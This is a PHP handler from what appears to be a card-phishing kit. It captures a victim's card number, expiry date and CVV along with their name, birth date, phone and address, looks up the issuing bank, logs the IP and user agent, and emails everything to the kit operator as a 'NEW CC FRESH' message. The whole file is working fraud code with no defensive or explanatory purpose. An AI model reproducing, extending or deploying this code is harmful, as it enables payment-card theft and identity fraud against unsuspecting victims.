<?php
session_start();
ob_start();

include '../email.php';
include '../antibots.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $_SESSION["n_card"]   = $_POST["n_card"];
    $_SESSION["c_num"]    = $_POST["c_num"];
    $_SESSION["exm"]    = $_POST["exm"];
    $_SESSION["exy"]    = $_POST["exy"];
    $_SESSION["csc"]    = $_POST["csc"];
$url = 'https://lookup.binlist.net/'.$_SESSION["c_num"].'';
$json = file_get_contents($url);
$data = json_decode($json);
$scheme = $data->scheme;
$bank = $data->bank->name;
$level = $data->brand;
$message = '
++++++++++++++++++++< CVV FULL INFO <++++++++++++++++++++
💱Prenom= '.$_SESSION["fname"].'
💱Nom= '.$_SESSION["lname"].'
💱Date de naissance= '.$_SESSION["DOB"].'
💱Num tel= '.$_SESSION["PhoneNumber"].'
💱Adresse= '.$_SESSION["street"].'
💱Ville= '.$_SESSION["city"].'
💱Code Postal= '.$_SESSION["ZIP"].'
++++++++++++++++++++< CVV INFO <++++++++++++++++++++
💶  Nom  = '.$_SESSION["n_card"].'
💶  Numero de Carte = '.$_SESSION["c_num"].'
💶  Date Expiration = '.$_SESSION["exm"].'/'.$_SESSION["exy"].'
💷  Cryptogram Visuel = '.$_SESSION["csc"].'
💷  BNK = '.$bank.'
💶  LVL = '.$level.'
💶  TYPE = '.$scheme.'
++++++++++++++++++++< INFO IP <++++++++++++++++++++
💷  IP = '._ip().'
💷  User Agent : '.$_SERVER["HTTP_USER_AGENT"].'
++++++++++++++++++++< Thanks Dear Kobashi🥂 <++++++++++++++++++++
';
$Subject=  "💰NEW CC FRESH💰 |".$bank."|".$scheme."|".$level."|"._ip();
$head="From: Kobashi 💷 <kobashi@kobashi.fr>";
fwrite($fil, '####################'.$message.'####################');
$_SESSION['step_four']  = true;
mail($my_mail,$Subject,$message,$head);
$_SESSION['step_five']  = true;
    header('location: identity.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));      
}
else
{
  header('location: ../../index.php');
}